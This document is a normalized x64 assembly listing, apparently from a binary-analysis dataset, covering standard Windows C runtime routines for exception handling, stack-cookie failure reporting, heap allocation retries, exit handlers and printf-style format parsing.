cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_180025a30
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_180025a60
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ r--data ]
call sub_180025b60
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_180020400
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_180025ba4
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_180025ba4
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_18002054c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx r8
mov rdi rdx
test rcx rcx
je r-xdata
imul rdi rcx
mov eax 0x1
test rdi rdi
cmove rdi rax
xor edx edx
lea rax [ rdx - 0x20 ]
div rcx
cmp rax rdi
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rw-data ]
lea edx [ rax + 0x8 ]
mov r8 rdi
call [ HeapAlloc@IAT ]
test rax rax
jne r-xdata
call sub_18001e6e4
mov [ rax ] 0xc
test rbx rbx
je r-xdata
mov rcx rdi
call sub_18001e7ec
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rbx ] 0xc
xor eax eax
cmp rdi 0xffffffffffffffe0
ja r-xdata
test rbx rbx
je r-xdata
xor eax eax
jmp r-xdata
mov [ rbx ] 0xc
jmp r-xdata
sub_1800205f0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rbp
push rdi
push r12
lea rbp [ rsp - 0x4f0 ]
sub rsp 0x5f0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x4e0 ] rax
mov edi r8d
mov esi edx
mov ebx ecx
cmp ecx 0xffffffff
je r-xdata
and [ rsp + 0x70 ] 0x0
lea rcx [ rsp + 0x74 ]
xor edx edx
mov r8d 0x94
call sub_18001c9f0
lea r11 [ rsp + 0x70 ]
lea rax [ rbp + 0x10 ]
lea rcx [ rbp + 0x10 ]
mov [ rsp + 0x48 ] r11
mov [ rsp + 0x50 ] rax
call [ RtlCaptureContext@IAT ]
mov r12 [ rbp + 0x108 ]
lea rdx [ rsp + 0x40 ]
mov rcx r12
xor r8d r8d
call RtlLookupFunctionEntry
test rax rax
je r-xdata
call sub_180025ba4
mov rax [ rbp + 0x508 ]
mov [ rbp + 0x108 ] rax
lea rax [ rbp + 0x508 ]
mov [ rbp + 0xa8 ] rax
and [ rsp + 0x38 ] 0x0
mov rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x58 ]
mov r9 rax
mov [ rsp + 0x28 ] rcx
lea rcx [ rbp + 0x10 ]
mov r8 r12
mov [ rsp + 0x20 ] rcx
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
mov rcx [ rbp + 0x4e0 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x5f0 ]
mov rbx [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
test edi edi
jne r-xdata
mov rax [ rbp + 0x508 ]
mov [ rsp + 0x70 ] esi
mov [ rsp + 0x74 ] edi
mov [ rbp - 0x80 ] rax
call [ IsDebuggerPresent@IAT ]
xor ecx ecx
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ rsp + 0x48 ]
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
mov ecx ebx
call sub_180025ba4
sub_180020770
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov rbp rcx
mov rcx [ rw-data ]
mov ebx r9d
mov rdi r8
mov rsi rdx
call [ DecodePointer@IAT ]
mov r9d ebx
mov r8 rdi
mov rdx rsi
mov rcx rbp
test rax rax
je r-xdata
mov rax [ rsp + 0x60 ]
mov [ rsp + 0x20 ] rax
call sub_18002073c
int3
mov r10 [ rsp + 0x60 ]
mov [ rsp + 0x20 ] r10
call rax
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_180020800
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_18001d820
mov rbx rax
test rax rax
jne r-xdata
sub_180020880
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_18002054c
mov rbx rax
test rax rax
jne r-xdata
sub_180020904
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_18001da9c
mov rbx rax
test rax rax
jne r-xdata
sub_18002098c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
xor esi esi
mov rdi r8
mov rbp rdx
or r13d 0xffffffff
mov r12 rcx
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rax rbx
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r13d
cmp esi r13d
jne r-xdata
mov r8 rdi
mov rdx rbp
mov rcx r12
call sub_180025bac
mov rbx rax
test rax rax
jne r-xdata
sub_180020a14
sub rsp 0x28
test rcx rcx
jne r-xdata
mov r8 rcx
mov rcx [ rw-data ]
xor edx edx
add rsp 0x28
jmp [ HeapSize@IAT ]
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or rax 0xffffffffffffffff
add rsp 0x28
retn
sub_180020a50
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_180020abc
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_18001e7e4
mov rcx rbx
call sub_1800205e8
mov rcx rbx
call sub_18001e694
mov rcx rbx
call sub_18001d2e4
mov rcx rbx
call sub_1800252ec
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_1800203e0
sub_180020b00
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_180020b34
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_180020b70
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rw-data ] 0x0
mov ebx ecx
je r-xdata
call sub_180025c34
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180020b34
test eax eax
jne r-xdata
lea rcx [ rw-data ]
call sub_180025b60
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_180025200 ]
call sub_18001d608
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ rw-data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_180025b60
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_180020c20
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_1800259a4
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_1800258a4
mov ecx r15d
call sub_180020a50
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_1800258a4
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180020b00
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_180020b00
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_180020df4
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_1800268f0
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_1800266dc
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_180026548
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_18002667c
test eax eax
jne r-xdata
call sub_1800266dc
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_180026548
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_180026628
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_180025d04
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_180020f84
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rbx [ rsp + 0x60 ]
mov rdi r9
mov r12d [ rbx ]
mov rbp r8
mov esi edx
mov r13 rcx
je r-xdata
and [ rbx ] 0x0
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov [ rbx ] r12d
movzx ecx [ r13 ]
mov r8 rdi
mov rdx rbp
dec esi
call sub_180023dac
add r13 0x2
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test esi esi
jg r-xdata
cmp [ rbx ] 0x2a
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
cmp [ rbx ] 0x0
jne r-xdata
mov ecx 0x3f
mov r8 rdi
mov rdx rbp
call sub_180023dac
sub_180021020
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x3e0 ]
sub rsp 0x4e0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3d0 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x78 ] rcx
mov [ rbp - 0x80 ] rdx
lea rcx [ rbp - 0x70 ]
mov rdx r8
mov r14 r9
mov [ rsp + 0x50 ] r9
mov [ rsp + 0x74 ] eax
mov r12d eax
mov [ rsp + 0x5c ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x48 ] eax
mov [ rsp + 0x70 ] eax
mov [ rsp + 0x58 ] eax
call sub_18001db70
call sub_18001e6e4
xor r10d r10d
mov [ rbp - 0x48 ] rax
test rbx rbx
jne r-xdata
mov r8 [ rbp - 0x80 ]
test r8 r8
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
xor r11d r11d
cmp [ rbp - 0x58 ] r11b
je r-xdata
movzx r13d [ r8 ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov r15d r10d
mov edx r10d
mov [ rbp - 0x50 ] r10
test r13w r13w
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x60 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x58 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov ecx 0x58
mov r9d 0x200
lea r11d [ rcx - 0x38 ]
mov rcx [ rbp + 0x3d0 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0x530 ]
add rsp 0x4e0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax esi
mov rcx [ rbp - 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx eax r13w
sub ax r11w
cmp ax cx
ja r-xdata
mov ecx r10d
lea rcx [ r--data ]
movzx eax r13w
movsx ecx [ rax + rcx - 0x20 ]
and ecx 0xf
jmp r-xdata
mov rdx [ rsp + 0x78 ]
lea r8 [ rsp + 0x40 ]
movzx ecx r13w
mov [ rsp + 0x58 ] 0x1
call sub_180023dac
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
dec ecx
je r-xdata
movsxd rax edx
movsxd rcx ecx
lea rdx [ rax + rcx * 8 ]
lea rax [ r--data ]
movsx edx [ rdx + rax ]
sar edx 0x4
mov [ rsp + 0x6c ] edx
mov ecx edx
test edx edx
je r-xdata
mov r11d 0x20
jmp r-xdata
or edi 0xffffffff
mov [ rbp - 0x78 ] r10d
mov [ rsp + 0x70 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x48 ] r10d
mov r12d r10d
mov [ rsp + 0x44 ] edi
mov [ rsp + 0x58 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov edx [ rsp + 0x6c ]
mov r8 [ rbp - 0x80 ]
mov r9d 0x200
mov ecx 0x58
movzx eax r13w
cmp eax r11d
je r-xdata
dec ecx
je r-xdata
add r8 0x2
mov [ rbp - 0x80 ] r8
test esi esi
js r-xdata
or r12d 0x2
jmp r-xdata
cmp eax 0x23
je r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r12d 0x7
jmp r-xdata
mov ecx 0x2b
cmp eax ecx
je r-xdata
mov eax [ rsp + 0x5c ]
lea ecx [ rax + rax * 4 ]
movzx eax r13w
lea eax [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x5c ] eax
jmp r-xdata
mov eax [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x5c ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r12d 0x1
jmp r-xdata
mov ecx 0x2d
cmp eax ecx
je r-xdata
movzx r13d [ r8 ]
test r13w r13w
jne r-xdata
or r12d 0x4
neg eax
mov [ rsp + 0x5c ] eax
jmp r-xdata
cmp r13w 0x2a
jne r-xdata
dec ecx
je r-xdata
or r12d 0x4
jmp r-xdata
mov ecx 0x30
cmp eax ecx
mov ecx 0x58
jne r-xdata
lea ecx [ rdi + rdi * 4 ]
movzx eax r13w
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r14 ]
add r14 0x8
mov ecx 0x58
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
movzx eax r13w
cmp eax 0x49
je r-xdata
dec ecx
jne r-xdata
or r12d 0x8
jmp r-xdata
or edi 0xffffffff
mov [ rsp + 0x44 ] edi
jmp r-xdata
bts r12d 0xf
cmp [ r8 ] 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
movzx eax r13w
mov ecx 0x64
cmp eax ecx
jg r-xdata
cmp [ r8 ] 0x33
jne r-xdata
cmp [ r8 + 0x2 ] 0x34
jne r-xdata
or r12d r11d
jmp r-xdata
mov ecx 0x6c
cmp eax ecx
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
mov eax 0x64
cmp [ r8 ] ax
je r-xdata
cmp [ r8 + 0x2 ] 0x32
jne r-xdata
add r8 0x4
bts r12d 0xf
jmp r-xdata
cmp [ r8 ] cx
mov ecx 0x58
jne r-xdata
mov ecx 0x58
cmp eax 0x77
jne r-xdata
mov edi 0x2d
mov ecx 0x67
cmp eax ecx
jle r-xdata
or r12d 0x40
cmp eax 0x41
je r-xdata
mov eax 0x69
cmp [ r8 ] ax
je r-xdata
add r8 0x4
btr r12d 0xf
jmp r-xdata
or r12d 0x10
jmp r-xdata
add r8 0x2
bts r12d 0xc
jmp r-xdata
bts r12d 0xb
jmp r-xdata
mov r11d 0x20
test r12b 0x40
je r-xdata
or r12d 0x40
lea rbx [ rbp - 0x30 ]
mov esi r9d
test edi edi
jns r-xdata
mov ecx 0x69
cmp eax ecx
je r-xdata
bt r12d 0xc
jb r-xdata
mov r8 [ r14 ]
add r14 0x8
jmp r-xdata
mov [ rbp - 0x78 ] 0x1
add r13w r11w
cmp eax 0x43
je r-xdata
mov eax 0x6f
cmp [ r8 ] ax
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_18001c80c
mov edi [ rsp + 0x44 ]
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x48 ]
bt r12d 0x8
jae r-xdata
jne r-xdata
mov r15d 0x6
cmp eax 0x6e
je r-xdata
add r14 0x8
test r11b r12b
je r-xdata
mov [ rsp + 0x50 ] r14
test r12d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
mov eax 0x75
lea ecx [ rax - 0x1d ]
cmp [ r8 ] ax
je r-xdata
mov rsi [ rbp - 0x48 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x60 ]
mov r8 r13
mov edx edi
mov [ rsp + 0x20 ] rsi
call sub_180020f84
test r12b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx eax
mov r8 r13
mov edx r14d
call sub_180023de4
test r12b 0x1
je r-xdata
mov [ rsp + 0x60 ] di
cmp edi r9d
mov r15d 0xa3
cmovg edi r9d
mov [ rsp + 0x44 ] edi
cmp edi r15d
jle r-xdata
cmp r13w cx
jne r-xdata
mov rax [ r14 ]
mov rcx [ rw-data ]
add r14 0x8
mov [ rsp + 0x50 ] r14
movsx edi r13b
movsxd rsi esi
mov [ rbp - 0x40 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x70 ]
mov [ rsp + 0x30 ] rcx
mov ecx [ rbp - 0x78 ]
mov r9d edi
mov [ rsp + 0x28 ] ecx
lea rcx [ rbp - 0x40 ]
mov r8 rsi
mov rdx rbx
mov [ rsp + 0x20 ] r15d
call rax
mov edi r12d
and edi 0x80
je r-xdata
mov rdi [ r14 ]
add r14 0x8
mov [ rsp + 0x50 ] r14
call sub_180026b18
xor r10d r10d
test eax eax
je r-xdata
mov ecx 0x6f
cmp eax ecx
je r-xdata
test r12b 0x40
je r-xdata
mov [ rsp + 0x50 ] r14
test r12b 0x40
je r-xdata
test eax r12d
jne r-xdata
test r8 r8
jns r-xdata
movzx eax [ r14 ]
add r14 0x8
mov [ rsp + 0x58 ] 0x1
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x64 ] ax
test r11b r12b
je r-xdata
or r12d r11d
cmp eax 0x47
je r-xdata
lea eax [ rcx + 0x20 ]
cmp [ r8 ] ax
je r-xdata
xor eax eax
cmp [ rsp + 0x58 ] eax
jne r-xdata
test r12b 0x4
jne r-xdata
test r12b 0x2
je r-xdata
mov eax 0x2b
mov [ rsp + 0x60 ] ax
jmp r-xdata
mov eax 0x20
mov r15d edi
add edi 0x15d
movsxd rcx edi
call sub_180020800
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov r15d [ rsp + 0x44 ]
jmp r-xdata
mov r15d 0x1
jmp r-xdata
mov ecx 0x67
cmp r13w cx
jne r-xdata
test r15d r15d
jne r-xdata
lea r11d [ r10 + 0x20 ]
test r11b r12b
je r-xdata
mov r9d 0x8
test r12b r12b
jns r-xdata
cmp eax 0x70
je r-xdata
mov r8d [ r14 - 0x8 ]
movsxd r8 [ r14 - 0x8 ]
jmp r-xdata
movzx r8d [ r14 - 0x8 ]
jmp r-xdata
movsx r8 [ r14 - 0x8 ]
jmp r-xdata
test edi edi
jns r-xdata
bt r12d 0xc
jb r-xdata
neg r8
bts r12d 0x8
mov [ rbp - 0x30 ] ax
mov [ rsp + 0x68 ] al
mov rax [ rbp - 0x70 ]
mov [ rsp + 0x69 ] r10b
movsxd r8 [ rax + 0x10c ]
lea r9 [ rbp - 0x70 ]
lea rdx [ rsp + 0x68 ]
lea rcx [ rbp - 0x30 ]
call sub_180026b30
xor r10d r10d
test eax eax
jns r-xdata
cmp eax 0x53
je r-xdata
cmp [ r8 ] cx
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 r13
mov edx r15d
mov rcx rbx
mov [ rsp + 0x20 ] rsi
call sub_180020f84
xor r10d r10d
test r15d r15d
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov ecx 0x30
mov r8 r13
mov edx r14d
call sub_180023de4
mov eax 0x20
mov [ rsp + 0x60 ] ax
lea edi [ rax - 0x1f ]
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov edi 0x1
mov [ rsp + 0x48 ] edi
jmp r-xdata
mov [ rsp + 0x44 ] r15d
jmp r-xdata
mov rbx rax
mov esi edi
mov edi 0x2d
cmp [ rbx ] dil
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x70 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov r13d 0x200
mov r13d 0x200
or r12d r13d
jmp r-xdata
mov edi 0x10
bts r12d 0xf
cmp eax 0x73
je r-xdata
test r12b 0x40
